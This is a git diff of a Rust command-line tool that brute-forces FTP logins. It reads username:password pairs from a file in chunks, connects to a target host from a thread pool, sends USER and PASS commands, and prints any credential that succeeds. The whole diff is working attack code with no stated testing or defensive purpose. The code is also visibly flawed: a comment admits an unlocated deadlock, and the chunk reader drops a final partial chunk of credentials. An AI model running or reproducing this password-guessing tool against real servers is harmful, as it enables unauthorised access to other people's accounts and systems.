@@ -2,13 +2,14 @@ mod constants;
 
 use clap::Parser;
 use constants::MAX_MESSAGE_SIZE;
-use itertools::Itertools;
+use std::fs::File;
+use std::io::{BufRead, BufReader};
 use std::sync::mpsc::{channel, Receiver, Sender};
+use std::sync::MutexGuard;
+use std::usize;
 use std::{
-    fs::read_to_string,
     io::{Read, Result, Write},
     net::TcpStream,
-    path::Path,
     sync::{Arc, Condvar, Mutex},
     time::Instant,
     vec::Vec,
@@ -25,60 +26,62 @@ struct Args {
     credentials: String,
 }
 
+const CHUNK_AMOUNT: usize = 10;
+
 fn main() -> Result<()> {
     let args = Args::parse();
-    let credential_list: Vec<String> = read_file_lines(&args.credentials);
-    println!("Found {:?} Credential(s)", credential_list.len());
     println!("Starting...");
     let now = Instant::now();
     // vsftpd default max conn = 5
     let pool = ThreadPool::new(4);
-    let mut buffer = [0; MAX_MESSAGE_SIZE];
     let host = args.host;
-    let chunks: Vec<Vec<String>> = credential_list
-        .into_iter()
-        .chunks(10)
-        .into_iter()
-        .map(|chunk| chunk.collect())
-        .collect();
     let pair = Arc::new((Mutex::new(false), Condvar::new()));
     let (sender, receiver): (Sender<u32>, Receiver<u32>) = channel();
-    for cred_chunk in chunks {
+    let cred_file = File::open(&args.credentials)?;
+    let cred_file_lines = File::open(&args.credentials)?;
+    let mut cred_amount: usize = BufReader::new(cred_file_lines).lines().count();
+    println!("credential count {}", cred_amount);
+    let reader = Arc::new(Mutex::new(BufReader::new(cred_file)));
+    if cred_amount % CHUNK_AMOUNT > 0 {
+        cred_amount = cred_amount + (CHUNK_AMOUNT - cred_amount % CHUNK_AMOUNT)
+    }
+    for _ in 0..cred_amount / CHUNK_AMOUNT {
+        let reader = reader.clone();
         let host = host.clone();
         let pair2 = pair.clone();
         let sender = sender.clone();
+        // DEADLOCK HERE SOMEWHERE
         pool.execute(move || {
-            let cred_chunk = cred_chunk.clone();
-            let copied_host = host.clone();
-            let mut stream = TcpStream::connect(host).unwrap();
-            stream.read(&mut buffer).unwrap();
-            // read welcome message and make sure the code is 220 (Service ready for new user)
-            // TODO retry later if not.
-            if buffer[..3] == [50, 50, 48] {
-                for cred in &cred_chunk {
-                    match attempt(cred, &mut stream, &sender) {
-                        Ok(code) => {
-                            if code == 1 {
-                                println!("------------- SUCCESS -------------");
-                                println!("{}", cred);
-                                println!("------------- SUCCESS -------------");
-                                let &(ref lock, ref cvar) = &*pair2;
-                                let mut done = lock.lock().unwrap();
-                                *done = true;
-                                // We notify the condvar that the value has changed.
-                                cvar.notify_one();
+            let guard = reader.lock().unwrap();
+            match get_chunk(guard) {
+                Some(chunk) => {
+                    let mut buffer = [0; MAX_MESSAGE_SIZE];
+                    let mut stream = TcpStream::connect(host).unwrap();
+                    stream.read(&mut buffer).unwrap();
+                    // [50,50,48] = 220 = ready for new users
+                    if buffer[..3] == [50, 50, 48] {
+                        for cred in chunk {
+                            match attempt(&cred, &mut stream, &sender) {
+                                Ok(code) => {
+                                    if code == 1 {
+                                        println!("------------- SUCCESS -------------");
+                                        println!("{}", cred);
+                                        println!("------------- SUCCESS -------------");
+                                        let &(ref lock, ref cvar) = &*pair2;
+                                        let mut done = lock.lock().unwrap();
+                                        *done = true;
+                                        // We notify the condvar that the value has changed.
+                                        cvar.notify_one();
+                                    }
+                                }
+                                Err(err) => {
+                                    println!("{:}", err)
+                                }
                             }
-                        }
-                        Err(err) => {
-                            println!("{:}", err)
                         }
                     }
                 }
-            } else {
-                println!(
-                    "It appears that {:?} is not ready for new connections",
-                    copied_host
-                );
+                None => {}
             }
         })
     }
@@ -93,19 +96,14 @@ fn main() -> Result<()> {
     Ok(())
 }
 
-fn read_file_lines(file_name: &str) -> Vec<String> {
-    let file_exists = Path::new(&file_name).is_file();
-    if !file_exists {
-        panic!("{}", format!("File {} does not exist!", file_name))
-    }
-    let contents = read_to_string(&file_name)
-        .unwrap_or_else(|_| panic!("Error reading from file {}", file_name));
-    return contents.lines().map(|line| line.to_string()).collect();
-}
-
 fn attempt(credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Result<u8> {
     if let [username, password] = &credential.split(':').take(2).collect::<Vec<&str>>()[..] {
-        sender.send(1);
+        match sender.send(1) {
+            Ok(_) => {}
+            Err(err) => {
+                println!("{}", err)
+            }
+        }
         println!("attempting: {} {}", username, password);
         stream.write(format!("USER {}\r\n", username).as_bytes())?;
         let mut buffer = [0; MAX_MESSAGE_SIZE];
@@ -121,4 +119,24 @@ fn attempt(credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Re
         }
     }
     return Ok(0);
+}
+
+fn get_chunk(mut reader: MutexGuard<BufReader<File>>) -> Option<Vec<String>> {
+    let mut chunk: Vec<String> = Vec::new();
+    for _ in 0..CHUNK_AMOUNT {
+        let mut line = String::new();
+        match reader.read_line(&mut line) {
+            Ok(res) => {
+                if res == 0 {
+                    return None;
+                } else {
+                    chunk.push(line.replace('\n', ""));
+                }
+            }
+            Err(err) => {
+                println!("Error reading to buffer {}", err);
+            }
+        }
+    }
+    Some(chunk)
 }
